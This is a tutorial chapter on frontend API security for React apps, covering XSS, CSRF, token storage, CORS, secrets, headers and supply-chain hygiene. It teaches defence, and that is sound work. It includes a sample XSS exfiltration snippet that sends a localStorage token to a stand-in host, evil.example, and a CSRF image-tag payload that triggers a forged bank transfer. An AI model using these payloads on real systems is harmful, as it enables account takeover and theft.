# API Security & Best Practices

Security is not a feature you bolt on at the end — it is a property of how you design data flow, store credentials, and trust input. This chapter covers the **frontend's slice** of API security: what a React/SPA can realistically defend against, what it **cannot** defend against, and the practices that keep you out of trouble.

!!! info "Where the frontend fits"
    The browser is a **hostile, fully-inspectable environment**. Anything shipped to the client — code, "secrets", validation rules — can be read, modified, and replayed by a determined user. The frontend's job is to protect *the user* (from XSS, from leaking their data) and to be a well-behaved client. **Authoritative security always lives on the server.** This chapter never asks the client to enforce something the server should.

This chapter builds on **[14.3 Authentication](14.3.Authentication.md)** and keeps the same stance: **HttpOnly-cookie-first** for tokens, and never `localStorage` for credentials without a loud caveat.

---

## 1️⃣ The Browser Threat Model

Before mitigations, know what you are defending against. For a React SPA the realistic threats are:

| Threat | Attacker goal | Who it hurts | Frontend can mitigate? |
| ------ | ------------- | ------------ | ---------------------- |
| **XSS** (Cross-Site Scripting) | Run JS in your origin | Your users | ✔️ Yes — primary frontend job |
| **CSRF** (Cross-Site Request Forgery) | Make the browser send authed requests | Your users | ⚠️ Partly — cookies + tokens |
| **MITM** (Man-in-the-middle) | Read/alter traffic | Your users | ✔️ HTTPS/HSTS |
| **Credential theft** | Steal tokens/session | Your users | ✔️ Storage choice |
| **Secret leakage** | Read API keys in bundle | You / your bill | ✔️ Don't ship secrets |
| **Supply-chain** | Malicious npm dependency | Everyone | ✔️ Audit + lockfiles |
| **Abuse / scraping / brute force** | Hammer your API | Your server | ❌ Server-side (frontend can soften UX) |

!!! danger "The golden rule"
    **Never trust the client.** A request can come from your React app, from `curl`, from a modified bundle, or from an attacker replaying captured traffic. Every authorization check, every business rule, every validation that *matters* must be re-enforced on the server. Client-side checks exist for **UX**, not security.

### The "same-origin" mental model

The browser groups everything by **origin** = `scheme + host + port`. Code, cookies, and storage are partitioned by origin. Most browser security (the Same-Origin Policy, cookie scoping, storage isolation) is about keeping origins from reading each other's stuff. XSS is dangerous precisely because it runs **inside your origin**, so it bypasses all of that.

## 2️⃣ Cross-Site Scripting (XSS)

XSS is the single most important threat for an SPA, because **XSS defeats almost every other defense**. If an attacker can run JavaScript in your origin, they can read anything JS can read, call your API as the user, and exfiltrate data.

### How XSS happens

XSS occurs when untrusted data is rendered as **executable markup/script** instead of inert text.

- **Stored XSS** — malicious input saved server-side, then served to others (e.g. a comment containing `<script>`).
- **Reflected XSS** — malicious input echoed straight back into the page (e.g. a search term in the URL).
- **DOM-based XSS** — the client itself writes untrusted data into a dangerous sink (`innerHTML`, `eval`, `dangerouslySetInnerHTML`).

### Why React is *mostly* safe by default

React **escapes** any string you interpolate into JSX. This is safe:

```jsx
// SAFE — React escapes the string; <script> renders as visible text, not code
function Comment({ body }) {
  return <p>{body}</p>;
}
```

The escape hatch is where danger lives:

```jsx
// DANGER — bypasses React's escaping entirely
function Article({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

!!! danger "`dangerouslySetInnerHTML` is named that for a reason"
    Only use it on HTML you have **sanitized** or that you fully control. Never feed it raw user input or an unsanitized API response. The same applies to `eval`, `new Function`, `setTimeout("...string...")`, `el.innerHTML`, `el.outerHTML`, and `document.write`.

### Why XSS breaks `localStorage` token storage

This is the crux of the auth stance in [14.3](14.3.Authentication.md). `localStorage` and `sessionStorage` are **readable by any JavaScript running on your origin**:

```js
// Anything that runs an XSS payload can do exactly this:
const stolen = localStorage.getItem("accessToken");
navigator.sendBeacon("https://evil.example/collect", stolen);
```

A token in `localStorage` is a **bearer token sitting in plaintext, reachable by script**. One XSS bug = full account takeover, and the stolen token works from the attacker's own machine until it expires.

!!! warning "The localStorage caveat (do not skip this)"
    `localStorage` is convenient but **not appropriate for credentials** (access tokens, refresh tokens, session IDs) unless you fully accept the XSS risk. An **HttpOnly cookie is unreadable by JavaScript**, so even successful XSS cannot exfiltrate the raw token. Prefer HttpOnly cookies; if you must hold an access token in JS, keep it **in memory only** (see §5), never persisted.

### XSS mitigations

#### 1. Output encoding (let React do it)

Render data as text. Avoid the dangerous sinks above. If you never call `dangerouslySetInnerHTML`, React's automatic escaping handles the bulk of XSS for you.

#### 2. Sanitize when you *must* render HTML

If you genuinely need to render user-authored HTML (rich-text comments, CMS content), sanitize it with a vetted library — **DOMPurify** — and never roll your own regex "sanitizer".

```jsx
import DOMPurify from "dompurify";

function RichContent({ untrustedHtml }) {
  // Strips <script>, event handlers (onerror, onclick...), javascript: URLs, etc.
  const clean = DOMPurify.sanitize(untrustedHtml, { USE_PROFILES: { html: true } });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

!!! tip "Watch out for `href`/`src` injection"
    Sanitizing tags isn't enough. A `javascript:` URL in an `<a href>` or a `data:` URL in an `<img src>` is also script execution. Validate URL schemes; allow only `http`, `https`, `mailto`, `tel`.

    ```jsx
    const SAFE = /^(https?:|mailto:|tel:)/i;
    const safeHref = (url) => (SAFE.test(url) ? url : "#");
    <a href={safeHref(link.url)} rel="noopener noreferrer">{link.label}</a>
    ```

#### 3. Content Security Policy (CSP) — defense in depth

A CSP is an HTTP response header that tells the browser which sources of script/style/etc. are allowed. It is a **second line of defense**: even if an attacker injects a `<script>`, a strict CSP can stop it from executing or from phoning home.

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  connect-src 'self' https://api.example.com;
  img-src 'self' data: https:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'
```

!!! warning "CSP is a server header, and `'unsafe-inline'` undermines it"
    A CSP must be sent by the **server** (or a strict meta tag for a subset of directives). Avoid `'unsafe-inline'` and `'unsafe-eval'` in `script-src` — they re-open the door XSS walks through. Modern best practice is a **nonce-based** or **hash-based** CSP. Note that some bundler/dev setups inject inline scripts; configure CSP for production builds and test it.

## 3️⃣ Cross-Site Request Forgery (CSRF)

CSRF tricks a logged-in user's **browser** into making an authenticated request the user didn't intend — because the browser **automatically attaches cookies** to requests to your domain, regardless of which site initiated them.

!!! note "CSRF only matters for *ambient* credentials"
    CSRF exploits credentials the browser sends **automatically**: cookies, HTTP Basic auth, client certs. If you authenticate with an `Authorization: Bearer` header that JS must add manually, a cross-site form/image **cannot** add that header, so classic CSRF doesn't apply. This is a real trade-off of cookie auth — and the reason cookie auth needs CSRF defenses.

```html
<!-- On evil.example, a victim who is logged into bank.example loads this: -->
<img src="https://bank.example/api/transfer?to=attacker&amount=1000" />
<!-- The browser attaches bank.example's session cookie automatically. -->
```

### Defense 1 — `SameSite` cookies (your first line)

`SameSite` tells the browser **not to send the cookie on cross-site requests**.

```js
// server
res.cookie("token", jwt, {
  httpOnly: true,
  secure: true,
  sameSite: "strict", // or "lax"
});
```

| Value | Cross-site behavior | Use when |
| ----- | ------------------- | -------- |
| `Strict` | Cookie never sent cross-site (even top-level navigation) | Max safety; can break inbound links into authed pages |
| `Lax` | Sent on top-level GET navigations, not on cross-site POST/`fetch` | Sensible default for most apps |
| `None` | Always sent — **requires `Secure`** | Cross-origin APIs, embedded widgets |

!!! tip "`SameSite=None` needs `Secure` and brings back CSRF risk"
    If your API is on a different *site* and you set `SameSite=None`, the cookie is sent cross-site again — so you **must** add CSRF tokens (below). `SameSite` is great but is not a complete solution alone: browser defaults vary, and `Lax` still allows cross-site top-level GETs.

### Defense 2 — CSRF tokens (synchronizer token pattern)

The server issues an unpredictable token tied to the session; the client must echo it back in a **header** (which a cross-site attacker cannot set). The attacker can't read the token (Same-Origin Policy), so they can't forge the request.

```jsx
// The CSRF token is delivered in a NON-HttpOnly cookie (readable by JS) or via an endpoint,
// then sent back as a header. The SESSION token stays HttpOnly.
import axios from "axios";

// axios has built-in support: read token from a cookie, attach it as a header
const api = axios.create({
  baseURL: "https://api.example.com",
  withCredentials: true,
  xsrfCookieName: "XSRF-TOKEN",   // cookie the server sets (JS-readable)
  xsrfHeaderName: "X-XSRF-TOKEN", // header axios echoes back
});
```

### Defense 3 — Double-submit cookie

A stateless variant: the server sets a random value in a (JS-readable) cookie; the client copies it into a request header. The server checks that cookie value === header value. Because cross-site script can't read your cookie or set custom headers on a cross-origin request, the values won't match for a forged request.

!!! warning "Don't confuse the two cookies"
    With CSRF tokens you end up with **two cookies**: the **HttpOnly session/auth cookie** (the actual credential, JS can't read it) and a **separate, readable CSRF cookie** whose value is echoed in a header. Keeping them distinct is the whole point — and it's why the auth credential stays HttpOnly even when CSRF tokens are in play.

!!! tip "Defense in depth"
    Use `SameSite=Lax/Strict` **and** CSRF tokens for cookie-based sessions. Belt and suspenders is correct here.

## 4️⃣ HTTPS & HSTS

Everything above is moot if traffic travels in plaintext — a network attacker can read cookies, steal tokens, and inject scripts.

- **HTTPS everywhere.** Encrypts traffic, prevents tampering, and is a prerequisite for `Secure` cookies, HTTP/2, service workers, and most modern web APIs.
- **HSTS** (`Strict-Transport-Security`) tells browsers to **only ever** use HTTPS for your domain, defeating downgrade and SSL-strip attacks.

```text
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

!!! danger "Never send credentials over HTTP"
    A `Secure` cookie is only sent over HTTPS — good. But also ensure your app itself is served over HTTPS and redirects HTTP → HTTPS. In production, mixed content (an HTTPS page loading HTTP resources) is blocked by browsers and breaks the page; fix it, don't disable the warning.

## 5️⃣ Secure Token Storage Trade-offs

This is the most-argued topic in SPA security. The honest answer: **every option is a trade-off**, and the right default is the one from [14.3](14.3.Authentication.md) — HttpOnly cookies.

| Storage | XSS-safe? | CSRF-safe? | Survives reload? | Sent automatically? | Verdict |
| ------- | --------- | ---------- | ---------------- | ------------------- | ------- |
| **HttpOnly cookie** | ✔️ JS can't read it | ⚠️ Needs `SameSite` + CSRF token | ✔️ Yes | ✔️ Yes (by browser) | ⭐ **Recommended** |
| **In-memory (JS variable / React state)** | ⚠️ Readable by XSS, but vanishes on reload (smaller window) | ✔️ Not auto-sent | ❌ No (lost on refresh) | ❌ Manual header | ✔️ Good for access tokens |
| **`localStorage`** | ❌ Fully readable by any script | ✔️ Not auto-sent | ✔️ Yes | ❌ Manual header | ❌ **Avoid for credentials** |
| **`sessionStorage`** | ❌ Readable by script (per-tab) | ✔️ Not auto-sent | ⚠️ Per-tab only | ❌ Manual header | ❌ Avoid for credentials |

### The recommended pattern

!!! tip "Best of both worlds"
    - **Refresh token → HttpOnly, `Secure`, `SameSite` cookie.** Never touches JavaScript. Used only against `/refresh`.
    - **Access token → in memory** (a module variable or auth context), short-lived (5–15 min). On page reload, silently call `/refresh` to get a fresh one.
    - This keeps the long-lived credential out of JS entirely, and limits the blast radius of the short-lived one.

```jsx
// auth-store.js — access token lives in memory only, never persisted
let accessToken = null;
export const setAccessToken = (t) => { accessToken = t; };
export const getAccessToken = () => accessToken;
```

```jsx
// api.js — attach it via interceptor; refresh uses the HttpOnly cookie
import axios from "axios";
import { getAccessToken, setAccessToken } from "./auth-store";

export const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL,
  withCredentials: true, // send the HttpOnly refresh cookie to /refresh
});

api.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});

api.interceptors.response.use(
  (res) => res,
  async (error) => {
    if (error.response?.status === 401 && !error.config._retry) {
      error.config._retry = true;
      const { data } = await api.post("/refresh"); // HttpOnly cookie sent automatically
      setAccessToken(data.accessToken);
      error.config.headers.Authorization = `Bearer ${data.accessToken}`;
      return api(error.config);
    }
    return Promise.reject(error);
  }
);
```

!!! warning "If you persist a token, you've accepted the XSS risk"
    There are legitimate reasons teams use `localStorage` (no shared cookie domain, mobile-webview constraints, third-party API tokens with tight scopes). That's a *decision*, not a default — and it only holds if your XSS defenses (§2) are airtight, tokens are short-lived, and the scope is minimal. Do not reach for it just to dodge a refresh flow.

## 6️⃣ CORS — A Browser Policy, Not Authentication

CORS (Cross-Origin Resource Sharing) is the **most misunderstood** topic in frontend security.

!!! danger "CORS does NOT protect your server"
    CORS is a **browser-enforced policy that protects the *user*, not the server.** It controls whether **browser JavaScript** is allowed to *read* a cross-origin response. It does **not** stop requests from reaching your server, and it is trivially bypassed by any non-browser client (`curl`, Postman, a script, a mobile app). **CORS is not authentication, not authorization, and not a firewall.**

### What actually happens

1. The Same-Origin Policy blocks JS on `app.example.com` from **reading** responses from `api.other.com`.
2. CORS is the server's way of saying "it's OK for that origin's JS to read my responses," via `Access-Control-Allow-Origin` and friends.
3. For "non-simple" requests, the browser first sends a **preflight** `OPTIONS` request to ask permission.

```text
Browser → OPTIONS /data (preflight) → Server replies:
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: GET, POST
  Access-Control-Allow-Headers: Authorization, Content-Type
  Access-Control-Allow-Credentials: true
Browser → actual GET /data (only now)
```

```jsx
// Frontend side: to send cookies cross-origin you opt in:
const api = axios.create({
  baseURL: "https://api.example.com",
  withCredentials: true, // browser includes cookies; server MUST allow credentials
});
```

!!! warning "Two CORS misconfigurations to avoid"
    1. **`Access-Control-Allow-Origin: *` *with* credentials** is forbidden by the spec — and reflecting *any* `Origin` back while allowing credentials effectively trusts every site. Whitelist exact origins.
    2. A CORS error in the console means **your server didn't grant permission** — fix it on the server. Do **not** "solve" it by disabling browser security, using a public CORS-proxy in production, or weakening the policy to `*`.

!!! note "Where real protection lives"
    Because CORS doesn't stop requests, your **server** must still authenticate every request (tokens/cookies) and authorize every action. Treat CORS purely as "which front-end origins may read my responses in a browser."

## 7️⃣ Secrets Handling — Never Ship Secrets to the Client

!!! danger "Everything in your bundle is public"
    Your JS bundle, your `.env` values that get inlined, your source maps — all of it is downloadable and readable by anyone. **There is no such thing as a secret in the browser.** A "hidden" API key in your React code is a published API key.

### Build-time env vars are *embedded*, not hidden

Vite and Next.js inline certain env vars into the bundle **at build time**. The prefix is a signal that the value is **public**:

| Framework | Public prefix (shipped to browser) | Private (server-only) |
| --------- | ---------------------------------- | --------------------- |
| **Vite** | `VITE_` → `import.meta.env.VITE_*` | anything without the prefix |
| **Next.js** | `NEXT_PUBLIC_` → `process.env.NEXT_PUBLIC_*` | `process.env.*` used only in server code |
| **Create React App** | `REACT_APP_` | n/a |

```js
// FINE — public config: API base URL, publishable keys (e.g. a Stripe *publishable* key)
const apiUrl = import.meta.env.VITE_API_URL;

// NEVER — this secret is now in your bundle for the world to read:
const stripeSecret = import.meta.env.VITE_STRIPE_SECRET_KEY; // ❌❌❌
```

!!! warning "`VITE_` / `NEXT_PUBLIC_` = intentionally public"
    Anything you prefix this way is **compiled into client code**. Only put values there that you're comfortable printing on a billboard: API base URLs, publishable/anon keys *designed* for client exposure, feature flags. Real secrets (private API keys, DB credentials, signing secrets) must stay **server-side** and be accessed only by your backend / serverless functions / BFF.

!!! tip "The pattern for third-party secrets"
    If the frontend needs to call a service that requires a secret key (payment provider, email API, AI provider), **proxy through your own backend**. The browser calls *your* endpoint (authenticated); your server adds the secret and calls the third party. The secret never leaves the server.

Also: keep `.env*` files **out of git** (`.gitignore`), and disable or restrict source maps in production if your build would otherwise expose internal structure.

## 8️⃣ Input Validation & Response Validation (Zod)

!!! note "Client validation is for UX; server validation is for security"
    Validate input on the client so users get instant feedback — but **never rely on it for security**. Anyone can bypass the form. The server must re-validate everything. That said, the frontend should still validate **what comes back**, because a malformed/untrusted response can crash your app or feed bad data into dangerous sinks.

### Validating API responses with Zod

Treating API responses as `any` is how `undefined is not a function` ends up in production. A schema gives you runtime guarantees *and* TypeScript types from one source.

```ts
import { z } from "zod";
import { api } from "./api";

const User = z.object({
  id: z.string().uuid(),
  email: z.string().email(),
  role: z.enum(["user", "admin"]),
  // Validate any URL you'll later put in href/src
  avatarUrl: z.string().url().startsWith("https://").optional(),
});

type User = z.infer<typeof User>;

export async function getUser(id: string): Promise<User> {
  const { data } = await api.get(`/users/${id}`);
  // Throws if the server sent something unexpected — fail loud, not silently
  return User.parse(data);
}
```

!!! tip "Validate, sanitize, then render"
    The safe pipeline is: **validate** the shape (Zod) → **sanitize** any HTML/URLs (DOMPurify, scheme allow-list) → **render** as text via React. Each step assumes the previous data is still untrusted.

## 9️⃣ Rate Limiting & Abuse — The Client's Role

!!! danger "Rate limiting is enforced on the server"
    A client **cannot** rate-limit an attacker — the attacker controls the client. Brute-force protection, per-IP/per-account throttling, and bot mitigation are **server-side**. The frontend's job is to (a) not *cause* abuse, and (b) handle `429 Too Many Requests` gracefully.

### Be a good client

- **Debounce/throttle** search-as-you-type and autosave so you don't hammer the API (see [14.4 Advanced API Scenarios](14.4.Advanced API Scenarios.md)).
- **Cancel** stale in-flight requests with `AbortController`.
- **Cache** with React Query/SWR instead of refetching constantly.

### Handle `429` correctly (respect `Retry-After`)

```js
api.interceptors.response.use(
  (res) => res,
  async (error) => {
    if (error.response?.status === 429) {
      const retryAfter = Number(error.response.headers["retry-after"]) || 5;
      // Back off, surface a friendly message, then retry once
      await new Promise((r) => setTimeout(r, retryAfter * 1000));
      return api(error.config);
    }
    return Promise.reject(error);
  }
);
```

!!! warning "Don't auto-retry blindly"
    Retrying `4xx` errors (except `429`) usually just repeats a client mistake. Only retry idempotent requests, cap the attempts, and use **exponential backoff with jitter** so you don't synchronize a thundering herd against an already-struggling server.

## 🔟 Dependency & Supply-Chain Hygiene

A typical React app ships **hundreds** of transitive dependencies. Each is code you execute and a potential attack vector (typosquatting, hijacked maintainer accounts, malicious post-install scripts).

```bash
# Audit for known vulnerabilities
npm audit
npm audit fix          # apply safe fixes
npm audit --production # focus on what actually ships, not devDependencies

# pnpm / yarn equivalents
pnpm audit
yarn npm audit
```

!!! tip "Lockfiles are a security control"
    **Commit your lockfile** (`package-lock.json` / `pnpm-lock.yaml` / `yarn.lock`). It pins exact versions and integrity hashes so a dependency can't silently change under you. In CI, install with `npm ci` (not `npm install`) so builds use the locked tree exactly.

!!! warning "Supply-chain checklist"
    - Review new dependencies before adding them (downloads, maintenance, last publish, install scripts).
    - Prefer fewer, well-maintained packages over many micro-deps.
    - Enable automated updates with review (Dependabot / Renovate) — patch fast, but don't auto-merge majors.
    - Be wary of post-install scripts; consider `--ignore-scripts` in CI where feasible.
    - Pin and verify anything loaded from a CDN with **Subresource Integrity (SRI)**:
      ```html
      <script src="https://cdn.example/lib.js"
              integrity="sha384-…" crossorigin="anonymous"></script>
      ```

## 1️⃣1️⃣ Secure HTTP Headers

Most frontend hardening is delivered via **response headers** set by your server, CDN, or host (Netlify/Vercel config, nginx, Express `helmet`). Know what each does:

| Header | Purpose |
| ------ | ------- |
| `Content-Security-Policy` | Restrict script/style/connect sources — top XSS mitigation (§2) |
| `Strict-Transport-Security` | Force HTTPS (§4) |
| `X-Content-Type-Options: nosniff` | Stop MIME-sniffing that can turn data into script |
| `X-Frame-Options: DENY` / CSP `frame-ancestors 'none'` | Prevent clickjacking via iframing |
| `Referrer-Policy: strict-origin-when-cross-origin` | Limit URL/PII leakage in the `Referer` header |
| `Permissions-Policy` | Disable unused powerful features (camera, geolocation, …) |

!!! tip "Use a vetted middleware"
    On an Express/Node BFF, [`helmet`](https://helmetjs.github.io/) sets sane defaults for most of these in one line. On static hosts, configure them in your platform's headers file. Then **verify** the result with a header scanner (e.g. securityheaders.com) — defaults change, and a meta-tag CSP can't cover everything.

## 1️⃣2️⃣ Logging & PII Concerns

Frontend logging quietly leaks sensitive data if you're not careful.

!!! danger "Don't log secrets or PII to the console or to third parties"
    `console.log(response)` in production can dump tokens, emails, and personal data into the console and into any error-monitoring/analytics tool you've wired up (Sentry, LogRocket, session replay).

- **Strip credentials** from anything logged — tokens, `Authorization` headers, cookies, passwords.
- **Configure error monitors** to scrub PII (Sentry `beforeSend`, deny-lists for fields like `password`, `token`, `ssn`).
- **Session replay tools** (FullStory/LogRocket) record the DOM — **mask** inputs (passwords, card numbers, anything PII) so they aren't captured.
- **Don't put PII in URLs** — query strings land in server logs, browser history, and the `Referer` header. Send sensitive data in the body of a POST.
- Remove debug `console.*` calls from production builds (lint rule / build strip).

```js
// Scrub before reporting to an error monitor
function scrub(obj) {
  const SENSITIVE = ["password", "token", "authorization", "cookie", "ssn", "card"];
  return Object.fromEntries(
    Object.entries(obj).map(([k, v]) =>
      SENSITIVE.some((s) => k.toLowerCase().includes(s)) ? [k, "[REDACTED]"] : [k, v]
    )
  );
}
```

## ✅ Actionable Best-Practices Checklist

!!! success "Ship-it security checklist for a React + API frontend"
    **Transport**

    - [ ] HTTPS everywhere; HTTP redirects to HTTPS
    - [ ] `Strict-Transport-Security` (HSTS) enabled, ideally preloaded
    - [ ] No mixed content

    **XSS**

    - [ ] No `dangerouslySetInnerHTML` on unsanitized data
    - [ ] DOMPurify for any user-authored HTML
    - [ ] URL scheme allow-list for `href`/`src` (block `javascript:`)
    - [ ] Strict CSP (no `'unsafe-inline'`/`'unsafe-eval'`), nonce/hash based

    **Tokens & auth**

    - [ ] Refresh token in **HttpOnly + Secure + SameSite** cookie
    - [ ] Access token **in memory only**, short-lived
    - [ ] **No credentials in `localStorage`** (unless XSS risk explicitly accepted)
    - [ ] Secure logout actually invalidates the session server-side

    **CSRF (cookie auth)**

    - [ ] `SameSite=Lax`/`Strict` on auth cookies
    - [ ] CSRF token / double-submit for state-changing requests

    **CORS**

    - [ ] Exact-origin allow-list on the server (never `*` with credentials)
    - [ ] Understood as a browser policy, **not** as server protection

    **Secrets**

    - [ ] No secrets in the bundle; only `VITE_`/`NEXT_PUBLIC_` *public* values exposed
    - [ ] Third-party secret keys proxied through the backend
    - [ ] `.env*` git-ignored; production source maps restricted

    **Data integrity**

    - [ ] API responses validated at runtime (Zod), not trusted as `any`
    - [ ] Server re-validates **all** input (client validation is UX only)

    **Resilience & abuse**

    - [ ] Debounce/throttle/cancel/cache to avoid self-inflicted load
    - [ ] `429` handled with `Retry-After`; retries use backoff + jitter

    **Supply chain**

    - [ ] Lockfile committed; CI uses `npm ci`
    - [ ] `npm audit` in CI; Dependabot/Renovate enabled
    - [ ] SRI on CDN-loaded scripts

    **Headers & logging**

    - [ ] Security headers set (`helmet`/host config) and verified
    - [ ] No tokens/PII in logs, console, URLs, or session replays

!!! quote "The one-sentence summary"
    The frontend protects the **user** (XSS, secure storage, HTTPS, no leaked PII) and behaves as a **trustworthy client** (validates I/O, respects rate limits, ships no secrets) — but every decision that *matters* for security is **re-enforced on the server**, because the client can never be trusted.
